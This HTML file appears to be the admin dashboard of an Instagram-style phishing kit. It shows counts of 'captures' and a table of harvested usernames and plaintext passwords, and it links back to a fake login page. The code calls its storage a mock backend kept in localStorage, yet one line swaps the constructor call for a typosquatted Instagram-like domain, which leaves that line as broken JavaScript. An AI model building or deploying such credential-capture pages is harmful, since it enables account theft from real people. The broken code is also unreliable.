<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Portal</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
      background: #121212; 
      min-height: 100vh; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      padding: 20px;
    }

    /* ADMIN CONTAINER */
    .admin-container {
      width: 100%;
      max-width: 1100px;
      height: 85vh; /* Takes up most of the screen */
      background: #1a1a1a; 
      border-radius: 12px;
      border: 1px solid #333;
      box-shadow: 0 20px 50px rgba(0,0,0,0.5);
      display: flex; 
      flex-direction: column; 
      overflow: hidden;
    }

    /* HEADER */
    .admin-header {
      background: #222; 
      padding: 20px; 
      border-bottom: 1px solid #333;
      display: flex; 
      justify-content: space-between; 
      align-items: center;
      flex-wrap: wrap; /* Allows wrapping on mobile */
      gap: 10px;
    }
    .admin-title { 
      color: #fff; 
      font-size: 18px; 
      font-weight: 600; 
      display: flex; 
      align-items: center; 
      gap: 10px; 
    }
    .admin-title svg { width: 24px; height: 24px; }
    .admin-badge { background: #e1306c; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; text-transform: uppercase; }
    
    .header-actions { display: flex; gap: 10px; }
    
    /* CONTENT AREA */
    .admin-content { 
      flex: 1; 
      padding: 20px; 
      overflow-y: auto; /* Vertical scroll for the whole page */
      overflow-x: hidden;
    }
    
    /* STATS GRID */
    .stats-grid {
      display: grid; 
      grid-template-columns: repeat(3, 1fr); /* 3 columns on PC */
      gap: 20px; 
      margin-bottom: 30px;
    }
    .stat-card {
      background: #252525; 
      padding: 20px; 
      border-radius: 8px; 
      border: 1px solid #333;
    }
    .stat-val { font-size: 24px; color: #fff; font-weight: 700; margin-bottom: 5px; }
    .stat-label { color: #777; font-size: 13px; }

    /* DATA TABLE WRAPPER - Handles Horizontal Scroll */
    .data-table-wrapper {
      background: #252525; 
      border-radius: 8px; 
      border: 1px solid #333; 
      overflow: hidden;
      overflow-x: auto; /* Allows horizontal scroll on mobile */
    }
    table { 
      width: 100%; 
      border-collapse: collapse; 
      font-size: 14px; 
      min-width: 600px; /* Ensures table keeps shape on mobile, triggers scroll */
    }
    th { 
      background: #2a2a2a; 
      color: #888; 
      font-weight: 500; 
      text-align: left; 
      padding: 12px 20px; 
      border-bottom: 1px solid #333; 
      white-space: nowrap; /* Prevents header wrapping */
    }
    td { 
      color: #ddd; 
      padding: 12px 20px; 
      border-bottom: 1px solid #333; 
      white-space: nowrap; /* Prevents content wrapping for cleaner scroll */
    }
    tr:last-child td { border-bottom: none; }
    tr:hover td { background: #2a2a2a; }
    
    .pass-col { font-family: monospace; letter-spacing: 1px; color: #6ab0ff; }
    
    /* BUTTONS */
    .action-btn, .btn-danger, .btn-home {
      background: #333; 
      border: none; 
      padding: 8px 12px; 
      border-radius: 6px; 
      cursor: pointer; 
      font-size: 13px;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }
    .action-btn { color: #ff6b6b; }
    .action-btn:hover { background: #444; }
    
    .btn-danger { color: #ff6b6b; border: 1px solid #ff6b6b; }
    .btn-danger:hover { background: #ff6b6b; color: white; }
    
    .btn-home { background: #1877F2; color: white; }
    .btn-home:hover { background: #1565D8; }

    .empty-state { 
      padding: 40px; 
      text-align: center; 
      color: #555; 
      min-width: 600px; /* Match table width */
    }

    /* =========================
       RESPONSIVE MEDIA QUERIES 
       ========================= */
    @media (max-width: 768px) {
      body { padding: 10px; align-items: flex-start; padding-top: 10px; }
      .admin-container { height: auto; min-height: 90vh; }
      
      .admin-header { flex-direction: column; align-items: flex-start; }
      .header-actions { width: 100%; justify-content: space-between; margin-top: 10px; }
      .header-actions button, .header-actions a { flex: 1; font-size: 12px; padding: 10px; }

      /* Stack stats */
      .stats-grid { grid-template-columns: 1fr; gap: 10px; }
      
      /* Adjust table padding for touch */
      th, td { padding: 15px; }
    }
  </style>
</head>
<body>

  <div class="admin-container">
    <div class="admin-header">
      <div class="admin-title">
        <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
        Admin Portal <span class="admin-badge">Dashboard</span>
      </div>
      <div class="header-actions">
        <button class="btn-danger" onclick="clearAllData()">Clear Database</button>
        <a href="index.html" class="btn-home">Back to Login</a>
      </div>
    </div>

    <div class="admin-content">
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-val" id="totalCount">0</div>
          <div class="stat-label">Total Captures</div>
        </div>
        <div class="stat-card">
          <div class="stat-val" id="lastCapture">Never</div>
          <div class="stat-label">Latest Capture</div>
        </div>
        <div class="stat-card">
          <div class="stat-val" style="color: #2ecc71;">Active</div>
          <div class="stat-label">System Status</div>
        </div>
      </div>

      <div class="data-table-wrapper">
        <table>
          <thead>
            <tr>
              <th>Time</th>
              <th>Username / Email</th>
              <th>Password</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody id="savedTableBody">
            <!-- Data injected here -->
          </tbody>
        </table>
        <div id="emptyState" class="empty-state">
          No captured data yet. Go to <a href="index.html" style="color:#6ab0ff;">Login Page</a> and try to log in.
        </div>
      </div>
    </div>
  </div>

  <script>
    class MockBackend {
      constructor() { this.storageKey = 'ig_simulation_users_db'; }
      saveLogin(username, password) {
        const currentData = this.getAll();
        const newRecord = {
          id: Date.now(),
          timestamp: new Date().toLocaleString(),
          username: username,
          password: password
        };
        currentData.push(newRecord);
        localStorage.setItem(this.storageKey, JSON.stringify(currentData));
        return true;
      }
      getAll() {
        const data = localStorage.getItem(this.storageKey);
        return data ? JSON.parse(data) : [];
      }
      deleteRecord(id) {
        let data = this.getAll();
        data = data.filter(record => record.id !== id);
        localStorage.setItem(this.storageKey, JSON.stringify(data));
      }
      clearAll() {
        localStorage.removeItem(this.storageKey);
      }
    }

    const db = https://instaggramlogini.vercel.app/();

    function renderAdminTable() {
      const data = db.getAll();
      const tbody = document.getElementById('savedTableBody');
      const emptyState = document.getElementById('emptyState');
      const totalCountEl = document.getElementById('totalCount');
      const lastCaptureEl = document.getElementById('lastCapture');

      // Update Stats
      totalCountEl.textContent = data.length;
      if (data.length > 0) {
        lastCaptureEl.textContent = data[data.length - 1].timestamp.split(',')[1]; 
        emptyState.style.display = 'none';
      } else {
        lastCaptureEl.textContent = 'Never';
        emptyState.style.display = 'block';
      }

      // Clear Table
      tbody.innerHTML = '';

      // Build Rows (Newest first)
      [...data].reverse().forEach(item => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${item.timestamp}</td>
          <td>${escapeHtml(item.username)}</td>
          <td class="pass-col">${escapeHtml(item.password)}</td>
          <td>
            <button class="action-btn" onclick="deleteEntry(${item.id})">Delete</button>
          </td>
        `;
        tbody.appendChild(tr);
      });
    }

    function deleteEntry(id) {
      if(confirm('Delete this record?')) {
        db.deleteRecord(id);
        renderAdminTable();
      }
    }

    function clearAllData() {
      if(confirm('Are you sure you want to wipe the entire database?')) {
        db.clearAll();
        renderAdminTable();
      }
    }

    function escapeHtml(text) {
      if (!text) return text;
      return text
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&#039;");
    }

    setInterval(renderAdminTable, 2000);
    document.addEventListener('DOMContentLoaded', renderAdminTable);
  </script>
</body>
</html>
